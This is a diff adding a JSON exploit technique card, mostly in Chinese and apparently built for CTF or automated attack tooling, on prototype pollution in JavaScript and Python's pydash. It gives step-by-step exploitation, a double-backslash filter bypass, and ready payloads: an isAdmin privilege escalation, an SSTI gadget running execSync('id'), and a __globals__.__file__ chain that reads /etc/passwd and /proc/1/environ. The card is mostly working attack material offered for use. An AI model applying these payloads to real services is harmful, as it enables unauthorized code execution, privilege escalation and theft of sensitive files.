@@ -1,0 +1,74 @@
+{
+  "id": "web-prototype-pollution-rce",
+  "title": "原型链污染 -> gadget -> 提权/RCE",
+  "vuln_pattern": "prototype pollution (JS __proto__ / Python pydash-style set_/deep-merge) 污染共享原型或模块全局，注入影响后续逻辑的属性。Python pydash 分支尤其能经 __class__.__init__.__globals__ 改模块全局(如把 __file__ 污染成任意路径, 配合 open(__file__) 型端点即任意文件读)。",
+  "fingerprint": [
+    "prototype pollution",
+    "__proto__",
+    "constructor.prototype",
+    "原型链污染",
+    "pydash",
+    "lodash merge",
+    "deep merge",
+    "recursive merge",
+    "set(obj, path",
+    "污染",
+    "远程代码执行",
+    "代码执行",
+    "服务端",
+    "pydash set_",
+    "to_path",
+    "__class__",
+    "__init__",
+    "__globals__",
+    "__file__污染",
+    "python原型污染",
+    "双反斜杠转义",
+    "restricted_keys",
+    "模块全局污染",
+    "lodash set"
+  ],
+  "exploit_steps": [
+    "定位注入点：能否用 __proto__.x 或 constructor.prototype.x（JS）/ 深合并把键写进共享原型",
+    "先污染一个无害探针属性(如 __proto__.ppprobe=1)，再在另一个响应里确认该属性凭空出现——证明污染全局生效",
+    "找 gadget：污染一个被下游读取的属性——如模板引擎的 options(注入 SSTI 到 pug/handlebars 编译选项)、命令执行库的 shell/env、鉴权中间件的 isAdmin/role",
+    "把 gadget 属性污染成利用值，触发下游路径，拿到 RCE 或权限提升",
+    "[Python pydash/lodash 分支] 目标用 pydash.set_(obj, path, value) 或深合并、且 path 用户可控时: 可经属性链 __class__.__init__.__globals__.__file__ 把值写进【模块全局字典】——即污染任意模块级变量, 不只是原型。",
+    "路径过滤绕过(禁 . 或禁 _. 子串时): pydash to_path 的分隔符正则是『点前偶数个反斜杠才算分隔符』, 所以用 双反斜杠转义点 __class__\\\\.__init__\\\\.__globals__\\\\.__file__ —— 点前是反斜杠不是下划线, 整串无 _. 子串(过 app 过滤), pydash 仍拆成多段穿透。注意: 单反斜杠=转义=当作一个字面 token 不穿透; 中括号 [x] 在 pydash 里从来不是分隔符, 别用。",
+    "Python 侧强 gadget: 污染模块全局 __file__ 成目标路径, 再访问任何 open(__file__)/回显源码型端点 = 任意文件读; 有任意读后读 /proc/self/mountinfo 或 /proc/1/environ 定位平台挂载的 flag 文件。也可污染其它被下游读取的全局改行为。",
+    "版本前提(pydash): __globals__/__builtins__ 的 RESTRICTED_KEYS 守卫是 pydash 6.0+ 才加的; 6+/8.x 会直接报 『access to restricted key』封死这条路, 只有 5.x 无守卫双反斜杠链才成立。先探/试目标 pydash 版本。"
+  ],
+  "key_payloads": [
+    "{\"__proto__\":{\"ppprobe\":\"POLLUTED\"}}",
+    "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+    "污染模板 options 到 SSTI：{\"__proto__\":{\"block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require('child_process').execSync('id')\"}}}",
+    "# Python pydash 污染模块全局 __file__ -> 任意文件读(双反斜杠转义点绕过禁点/禁_.过滤):",
+    "{\"key\": \"__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.__file__\", \"value\": \"/etc/passwd\"}   # 经JSON传输时每处点前写4个反斜杠->解码成2个",
+    "# 有任意读后定位目标文件: 污染 __file__=/proc/self/mountinfo (或 /proc/1/environ / 应用源码) 读出敏感文件的真实路径, 再污染 __file__ 读它"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "prototype-pollution",
+    "rce",
+    "authbypass"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "存在把用户可控 JSON/键路径递归合并进对象的逻辑(merge/extend/set by dotted-path)",
+    "后续存在读取未显式设置属性的 gadget(模板引擎选项、命令拼接、权限字段)",
+    "[Python] 目标用 pydash/lodash 的 set_ 或深合并且键路径用户可控; 若要文件读, 存在 open(__file__)/回显源码型端点作 gadget。"
+  ],
+  "verify_oracle": "污染探针属性在无关对象上凭空出现(证明全局生效)；或 gadget 触发后回显 uid= / 命令输出 / isAdmin 生效",
+  "pitfalls": [
+    "很多库对 __proto__ 做了过滤但漏了 constructor.prototype——两者都试",
+    "污染是全局副作用，可能污染其它请求；探针名要唯一",
+    "JSON.parse 的 __proto__ 在纯对象里默认不生效，需目标自身用不安全的深合并",
+    "pydash 污染『不生效』先用【决定性 oracle】验证(如把 __file__ 污染到不存在路径, open(__file__) 端点应 500 而非回源码), 别臆测『多 worker 命中不同进程』就连打 N 次——多数是链没穿透。",
+    "禁点/禁 _. 过滤要用【双反斜杠】(点前偶数反斜杠)才穿透; 单反斜杠是转义、当一个字面键、不分段。中括号不是 pydash 分隔符。",
+    "pydash set_ 的 value 可为任意 JSON 类型, 但 JSON 注入不了 callable -> 直接拿到的是【任意读/改全局】而非直接 RCE(要污染到某个会被执行的 gadget 才 RCE)。",
+    "别拿 __init__ 之类会改动对象构造的键去反复试探污染载体对象——可能把它写坏(brick)导致后续污染整个失效; 改读 __globals__ 里的目标全局。"
+  ]
+}
